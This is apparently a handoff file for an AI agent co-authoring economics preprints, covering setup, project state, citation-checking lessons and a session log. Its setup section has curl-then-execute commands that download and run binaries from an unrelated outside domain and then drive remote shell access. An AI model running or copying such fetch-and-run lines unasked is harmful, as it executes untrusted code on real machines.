---
project: wealth-tensor
gh_sha: PENDING_STAMP
updated: 2026-08-10
session: wealthTensor-05
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge. No bridge theatrics; darlish does not use it.

Step 0 in a cold container, no pre-staged secret:

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

It prints a `DARLISH-ENROLL v1 id=… fp=…` line. Post it **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.

> **The collect may legitimately need TWO runs.** `dwait` times out at 150 s and prints a loud
> FAILED with three candidate causes. In wealthTensor-05 the attestation was posted correctly and
> the *first* collect still timed out; the second succeeded immediately. If you posted the comment
> and got a 404-tail timeout, **re-run before diagnosing**. Whole cycle: ~4 minutes, zero bridge
> calls, zero rotations noticed.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx && /tmp/dx --selftest
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-06 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-06 --resource wealth-tensor'
```

`roster claim` needs **`--who` AND `--resource`** (L23). dx exit 3 = never ran, safe retry; exit 4 =
check state first. **Do NOT route EDGAR or bulk web work through darwin** — the cloud container
reaches `data.sec.gov` and `www.sec.gov` directly (L18).

## 1 · IDENTITY + MISSION

You are Jason's co-author on **wealth-tensor** — an eleven-year synthesis being turned into **four
pre-prints** (ADR-001).

**Two intentions, equally weighted.** (1) Ship them. (2) **Have fun.** Hobby, no tenure, he is not
trying to be safe and says so. If it stops being enjoyable that is a defect, not a mood.

**He invites criticism and means it, and the evidence is now four sessions deep.** S3 reported that
his framework's sharpest prediction lost. wealthTensor-04 ran an agent instructed to *reject* the
flagship and accepted both FATAL findings. wealthTensor-05 found three defects in work that had
been marked complete forty minutes earlier. **Agreeing with him is not the job.**

**The prose is disposable; the structure is precious.** He remasters every sentence in his own
voice, so LLM-register drafting is fine. What must NOT happen is laundering *his* insight into your
paraphrase. When he coins something — *"force-fit, not form-fit"* (WT-042) — it goes in **verbatim**
and is credited.

**How he works on content:** his research notes are **on paper**. Read the note back to him before
building on it.

**Ask whether he has had his coffee.** A **register check, not a HITL gate** — pre-coffee, lead with
the recommendation and one line of why; hold the long argument until asked. A proposal that lands
badly at 05:30 is worth re-offering at 07:00 **shorter, not louder**.

**Audience: his three children, 18, 11 and 8.** Load-bearing. It decided that `docs/` stays public,
that *Abandoned Approaches* is in every paper, that the failed pre-registration is part of the
deliverable, and that the papers ship **with their own hostile referee reports**.

## 2 · ORIENT — run these, do not skim

```
git -C ~/repos/wealth-tensor pull --ff-only
python3 ~/repos/wealth-tensor/scripts/handoff_gate.py --check   # 0 pass · 1 blocker · 2 CANNOT VERIFY
cat  ~/repos/wealth-tensor/docs/adr/ADR-001-paper-decomposition.md      # incl. BOTH addenda
cat  ~/repos/wealth-tensor/docs/papers/paper-III-dual-tensor/REVIEW-001-internal-referee.md
cat  ~/repos/wealth-tensor/docs/LEDGER.md                        # 62 entries — the project's brain
python3 ~/repos/claude-blackbook/lessons.py doctrine
python3 ~/repos/claude-blackbook/lessons.py search "<your task>" --scope global,wealth-tensor
```

> **wealthTensor-05 skipped `lessons.py doctrine` at orient and paid for it twice** — it re-derived
> the "grep the wrong form" rule that was already banked, and it heredoc'd a script through `dx`
> ninety minutes after reading **L13**, which says in bold that multi-line will not survive dx
> quoting. **Run the doctrine command. It is four seconds.**

Corroborate what you use: `lessons.py use <id> --task <tag>` at orient,
`lessons.py record-outcome <tag> pass` at wrap.

## 3 · STATE

- **Code — 107 tests passing**, tree clean and pushed. Six model modules plus, new,
  `scripts/patchkit.py` (see L25) with four guard tests.
- **Paper II — COMPLETE.** References verified 2026-08-10, SHA pinned to **d655501**, zero live
  placeholders. Ready to submit when Jason says so.
- **Paper III — v0.3, post-referee, REFERENCES VERIFIED.** ~11k words. Ships with
  `REVIEW-001-internal-referee.md`. All 20 references ✓; **nine ✓✎ = verified against Jason's own
  copy**. F14 closed. The references preamble now **states the citation rule** the paper follows.
- **Paper I — written in evidence, unassembled as a document.** It is the fastest paper left.
- **Paper IV — unstarted.**
- **`scripts/prototypes/` — DECLARED SCRATCH**, synthetic only, WT-052 declaration inside. Needs
  `torch`, deliberately NOT in the project venv.
- **WT-026 remains CLOSED and it closed by failing.** PRE-002's stopping rule fired and stays fired.
- **Manuscript** (Google Doc `1RjAHJ7jHCX_N3ToHtstQvjlMb-BQz-iejBZ9Y4f58V8`) — untouched since S2.
  Restore points: S1 `1fszgf295NGfvfQlT3VaCrRXrXA4K589tlS-bVsUIok4` ·
  S2a `1FeXUSbrFQQXDOaSxCoul13lE6LWicxMuJGL8xJKSLjs` ·
  S2b `12jJh93VhgfOe8EQ3J23G9heQekSCdzxHTm75ut8RL6g`.

## 4 · DOCTRINE / GUARDRAILS

- **Blanket edit permission on the manuscript.** "A construction zone to build a mock-up."
- **Fresh restore point before every edit session, and VERIFY it.**
- **Never add a free parameter to absorb an objection.** Refused **six** times.
- **Every pre-registration states its BRIDGE assumption** as a numbered proposition (WT-049).
- **WT-052 — a registration must precede the INSTRUMENT'S CODE**, not merely the result.
- **WT-053 — every published number comes from a committed script that has been run.**
- **WT-054 — two adversarial agents before any preprint commits**, one checking numbers, one
  instructed to reject. They find disjoint defects. Keep the report in the repo.
- **WT-056 — prefer the STRUCTURAL fact to the CONTINGENT one.** Jason's rule, his words: *"ten
  years from now when an Nvidia-Mellanox controller for 6 GPUs is $50, this document will show its
  age."* Companion: *an abandonment that could not have cost you anything is an advertisement.*
- **WT-057 — grep the WRONG form across every file after a correction.** Never verify by re-reading
  the file you just fixed; that is the one place the fix is guaranteed.
- **WT-058 — a multi-anchor edit validates ALL anchors before writing.** Now enforced by
  `scripts/patchkit.py`, so do not hand-roll it (L25).
- **WT-059 — verifying a REFERENCE and verifying a CITATION are different acts.** Bibliographic:
  *does this work exist with these details?* Provenance: *is this the object the claim is about, and
  is it the one that was read?* The first passes while the second fails.
- **WT-060 — a word you use inconsistently is a word you have not checked.** Look up what it already
  means to your readers before standardising on the more frequent variant.
- **WT-061 — prose that counts or names items in an adjacent list is a hand-cached derived value.**
  Generate it, or write only what a later edit cannot falsify.
- **WT-062 — search Jason's library by TITLE, not author; a null is not absence; ASK before deleting
  a citation on the strength of one.**
- **A pre-registration is append-only after its first result commit.**
- **Do not oversell.** Standing guard-tests, including
  `test_a_flat_gini_does_not_mean_a_bounded_one` and
  `test_the_two_layer_recursion_collapses_to_the_form_limitation_4_publishes`.
- **The tone is load-bearing.** No grumpiness; humour lands the news.

## 4b · THE DECISION THAT FRAMES EVERYTHING · and the DEFINITION OF DONE

**`docs/adr/ADR-001-paper-decomposition.md` — read it, including BOTH addenda, before planning.**
The split and the order were both relitigated and reaffirmed 2026-08-10. Do not reopen either
without a reason neither addendum answers.

**I** price formation · **II** redistribution *(complete)* · **III** the dual tensor *(v0.3)* ·
**IV** the atomic theory. Order: **II → III → I → IV**.

> **DEFINITION OF DONE.** Four preprints publicly posted, each carrying: abstract, keywords, JEL
> codes, a numbered contributions list, an Abandoned Approaches section, a limitations section, a
> data/code availability statement naming the repo and a pinned commit SHA, and *Independent
> researcher* as the affiliation. Paper III additionally cites PRE-001/PRE-002 and their registering
> commit SHAs. When the fourth is posted, this project is done and the repo becomes an archive.

**Progress: II done. III drafted, reviewed and reference-complete. I written but unassembled. IV
unstarted.** Drive at finishing.

## 5 · MISSION — ranked

### START HERE — **Paper I.** It is the fastest artifact left and the only one blocking IV.

Complete in evidence, unassembled as a document. Per the ADR addendum it opens by **citing P3 from
Paper III** rather than restating it — that is the whole reason III went first. `excess_demand.py` +
`cournot.py`, 20 tests, headline numbers in ADR-001 §Decision. Model the reference discipline on
Paper III's: cite the edition consulted, mark ✓/✓✎, and check *cited-in-text* as a separate pass
from *bibliographically correct* (WT-059).

### 2 — **Read the crash-risk literature properly. This is Paper III's biggest remaining exposure.**

wealthTensor-05 discovered that **stock price crash risk** — Jin & Myers (2006), Hutton, Marcus &
Tehranian (2009), unbroken through 2026 — models firms hoarding bad news until it releases all at
once and the price moves discontinuously. **That is Paper III's thesis, twenty years earlier.** §9
now has a subsection positioning against it, *written from a search, not from having read the
papers.* A referee will know the difference. Read Jin & Myers and Hutton et al. properly and
strengthen or correct that subsection. The framing already in the paper — that the recognition event
is the accounting-layer cause of which the price crash is the effect — is the one to test.

### 3 — **Submit Paper II.** Done, and has been for two sessions.

Read `docs/papers/PREPRINT-CHECKLIST.md` §C and **re-verify the venue rules live** — checked
2026-08-05, venue rules rot. **SSRN has no gate in and NO APPEAL out** (WT-051). **This is a Jason
decision to trigger, not a Claude decision.** Ask.

### 4 — **Attribution pass (WT-044).** Still the best fix-to-value ratio.

Still absent from the papers: **Sraffa**, **Robinson**, **Samuelson**, **Godley/Lavoie in Paper I**,
**Farmer**, **Lillo**. Citations, not rewrites. Sraffa/Robinson/Samuelson matter most now that
scalar capital is the live target (WT-041). **Check his library first (L24) — the sweep is cheap and
it changed three citations in wealthTensor-05.**

### 5 — **Citation-graph whitespace test (WT-006).** `verify: grep -ril openalex src/ scripts/`

### 6 — **ASK Jason, both cheap, both genuinely his.**

- **Checkbox lists (WT-008).** All 57 manuscript references render as `- [ ]`. *Recommend:* plain
  bullets.
- **The twin document (WT-009).** `2The Axiomatic Reconstruction of`, 19 KB, never diffed. *Ask:*
  may a session spend one call diffing it? *Recommend:* yes, and before the manuscript is decomposed.

### 7 — **PRE-003: the segment-level test.** Teed up deliberately, NOT started.

A different project with a different registration. It registers from scratch, states its bridge
proposition (WT-049), obeys WT-052, and **may not cite PRE-001/002's failure as support for
anything.**

### 8 — **Language remaster.** His job, explicitly. Do not do it for him.

> **But note the distinction wealthTensor-05 drew and he accepted:** *correction* vs *crisis* looked
> like vocabulary and was a **term-of-art error** (WT-060). A word that is wrong *in the field's
> technical register* is yours to fix. A word that is merely his is not.

### TEED UP, small: the module identifiers `crisis_threshold` and `n_crises` still carry the old
vocabulary. The paper discloses them explicitly so nothing is wrong. Rename when something else is
already open in `lag.py`.

### PARKED, do not start — **THE MONOGRAPH.** After Paper IV. ADR-001 §Relitigation record.

## 6 · VERIFY GATE

```
cd ~/repos/wealth-tensor && ./.venv/bin/python -m pytest tests/ -q   # expect 107 passed
./.venv/bin/python scripts/wt027_report.py                          # Paper III §3.4 + §4
./.venv/bin/python scripts/wt002_lambda_report.py                   # Paper III §3.3
git commit ...                                                      # the LAST content commit
python3 scripts/handoff_gate.py --stamp
git commit -am "docs: stamp handoff gh_sha to HEAD"
python3 scripts/handoff_gate.py --emit
bash ~/Scripts/gate-selfcheck.sh                                    # expect PASS
/tmp/dx '~/Scripts/roster leave --who big-wealthTensor-06'
```

**`--emit` does not stamp**, and refuses on `gate_passed: false`. Walk
`~/Desktop/downloads/HANDOFF-GATE.md` — trust the file header for the version.

## 7 · ORIENT-THEN-GO

Emit ONE orientation line — `Oriented: <state> · next at-bat: <X> · opening with <first action>.` —
then proceed. Do not wait for Jason's go.

---

## LUT — hard-won facts. Read before touching anything.

| # | Fact |
|---|---|
| **L25** | **NEW — `scripts/patchkit.py` exists; use it for any multi-anchor documentation edit.** `from patchkit import apply_edits; apply_edits([(path, old, new, "label"), ...])`. It validates **every** anchor against in-memory text and raises `AnchorError` having written **nothing**. Four guard tests in `tests/test_patchkit.py`, and the one that matters asserts that an earlier *valid* edit does not leak to disk when a later anchor misses. **Anchor on a span with no internal newline** — in a file hard-wrapped at 100 columns, every anchor that has ever missed in this project missed on a line break, never on a word. |
| **L24** | **NEW — Jason's library is searchable from darwin and it settles citation questions the web cannot.** Copy-matched digitisations live in `~/Desktop/downloads` (flat; filenames usually carry publisher + year + ISBN) and `/Volumes/Jason2/BOOK MASTERS` (topic folders, flat inside). **Search by TITLE, not author** — Kindle exports keep the author in AZW metadata, not the filename, and his older devices do not index it; searching `mayo` returned an antitrust economist and missed the philosopher. **`find` on the NAS at full depth TIMES OUT** — use `-maxdepth 2`, or `ls` a topic folder. `pdftotext` is at `/opt/homebrew/bin/pdftotext`; a book's colophon is in its first 8–10 pages and answers the edition question outright. **A null result is "not in the indexed subset", NOT "he does not own it"** — he has seven Kindles and the collection is mid-reorganisation. **Ask before removing a citation on the strength of a null.** |
| **L23** | `roster claim` requires `--who` AND `--resource`. The standing brief's `roster claim <repo>` shorthand errors out. |
| **L22** | A mutation harness editing a Python source in place must clear `__pycache__` between mutants AND print a mutation-specific fingerprint. **The tell is two different mutants producing byte-identical failure output.** |
| **L21** | **The pre-registration workflow:** commit the registration **alone**, push, *then* write the analysis code, *then* compute. AMENDED by WT-052. |
| **L20** | `dx --put` fails if the parent directory does not exist on darwin. `dx 'mkdir -p …'` first. |
| **L19** | The CIK→SIC map including dead registrants is `sub.txt` inside the SEC Financial Statement Data Set quarterly ZIPs. Building a universe from a current registrant list is a **survivorship trap**. |
| **L18** | **The cloud container reaches `data.sec.gov` and `www.sec.gov` directly.** Do not route bulk web data through darwin. Work in the container, `dx --put` results to darwin, commit there where `gh` is authed. ≤10 req/s, descriptive User-Agent. |
| **L17** | **EDGAR `companyfacts`: Q4 is almost never tagged as a quarter.** Recover quarters by differencing cumulatives sharing a fiscal-year start date. ASC 350 puts annual impairment tests in Q4, so a naive parser deletes most goodwill events. |
| **L16** | Measure the manuscript, don't opine about it. Parsing it in python is three lines and has been right every time. |
| **L15** | Mutation-test any result you intend to publish, and confirm the *right* test screams. See L22. |
| **L14** | `conftest.py` only fires under pytest; `scripts/` needs its own shim: `sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent / "src"))`. |
| **L13** | **A multi-line commit message or script will not survive `dx`'s quoting** — and a heredoc will not either; wealthTensor-05 proved it a second time, ninety minutes after reading this line. `dx --put` it to a file (for commits, **`.git/COMMIT_DRAFT`**, then `git commit -F`). Inside `.git/` specifically: a draft in the working tree gets swept up by `git add -A`. Also: `$HOME` in the cloud shell is `/root` — use literal `~` in dx paths. |
| **L10** | Every model checked against a closed form, a published result, or a hand-verified case. |
| **L9**  | venv at `.venv`. Tests: `./.venv/bin/python -m pytest tests/ -q`. Root `conftest.py` inserts `src/`. |

**Google Docs API** *(unchanged; only needed if the manuscript is reopened)* — L1–L8, L11, L12 are
in `git log -p docs/HANDOFF.md`. The load-bearing four: **L11** use `find_and_replace_doc` to change
existing text (no indices, so the index minefield cannot bite). **L12** verify a doc edit
*structurally* by exporting via the cloud `Google_Drive__read_file_content` and diffing the array of
`#`-prefixed and list-item lines. **L3** never infer indices by arithmetic. **L7** cloud
`Google_Drive` is create/read only — but `copy_file` **is** a create, so **restore points need no
bridge**.

---

## WHAT wealthTensor-05 DID

**The assigned at-bat was ~20 minutes of reference checking. It took the session, and every
extension came from a defect in work that was already marked done.**

**Verified Paper III's references — and found seven that were never cited.** All twenty now check
against publishers, catalogues, Crossref and issuing-body documentation. But the *cited-in-text*
pass is a different pass, and it found Fama, the FASB topics, Mann & Whitney, Mayo, Nosek, Popper
and Chakrabarti listed and doing no work. Five were given the work they were listed for;
Chakrabarti was removed as Paper II's literature.

**Found the LEDGER carrying algebra the paper had already corrected.** WT-056's entry still had `d`
where δ belongs, 280× for the like-for-like 291×, "unrecoverable" where the result is conditioning,
and the cherry-picked δ = 0.01 case that `NOTE-001` §5 lists **by name** as its own error. The
previous session swept its handoff for expired truth and did not sweep the file its handoff calls
*the project's brain*. **An error there is not stale, it is authoritative and stale.** WT-057.

**Ran a provenance pass against Jason's own library, and it found what no publisher check could.**
Three of the books present there were cited as the wrong *object*: Popper is Routledge Classics 2002
whose colophon dates *Logik der Forschung* to 1935; Soddy is the 1961 Omni third edition, not the
1926 Allen & Unwin first; Piketty's French original is Seuil 2013. The references preamble now
states the rule — **cite the edition consulted, dual-date where the original does argumentative
work, and a printing is not an edition** — instead of leaving it implicit. WT-059.

**Discovered that "correction" was not a vocabulary tic but a term-of-art error, twice.** In finance
a correction is a ≥10% decline from a peak. And **ASC 250 is titled *Accounting Changes and Error
Corrections***, so the word asserted that prior statements required retrospective restatement — in
the technical register of the standard §5 is built on. The body now says **recognition event**; the
title keeps **crisis** and §4.1 defines it. WT-060.

**And that question found the paper's biggest exposure.** Searching for the field's preferred word
surfaced the **stock price crash risk** literature, which has been modelling this paper's thesis
since 2006 and was uncited. Now positioned in §9 — see mission item 2, and note that the positioning
was written from a search rather than from reading.

*The lesson of the session, and it is not the same as wealthTensor-04's.* That session learned to
**budget for the second pass**. This one learned that **the second pass must ask a different
question**. Three passes ran over the same seventeen references: bibliographic (clean), cited-in-text
(seven failures), provenance (three failures). Each found what the previous one *structurally could
not*, and repeating the first pass more carefully would have found none of it.

*And the failure worth copying.* Two provenance calls were **wrong**, and both erred toward
*deleting* a citation — a false positive on John W. Mayo, a false negative on an Odum sitting on a
different Kindle. When Jason searched by title he produced all four books, and the Mayo he had
actually read turned out to be the **1996** book that *introduces* the severity requirement rather
than the 2018 restatement that had been cited. **The citation ended up correct on both the
edition-consulted rule and the first-appearance rule, where before it was correct on neither.** An
hour spent believing a citation was unsupported produced a better citation than the one that was
there. **Note the direction of those errors: rigour that only ever subtracts is a bias with good
manners.**

*One more, filed under things a future session should find funny rather than repeat.* The References
closing note went stale **four separate times in one session** — once per correction to an entry
above it — because it hand-maintained counts and per-entry facts next to the entries themselves.
WT-061 diagnosed it as a hand-cached derived value, and it was still hand-maintained twice after
that. It is now narrative-only. **Grep catches WT-057's staleness; a differently-framed second pass
catches WT-059's; only regeneration catches this one.**
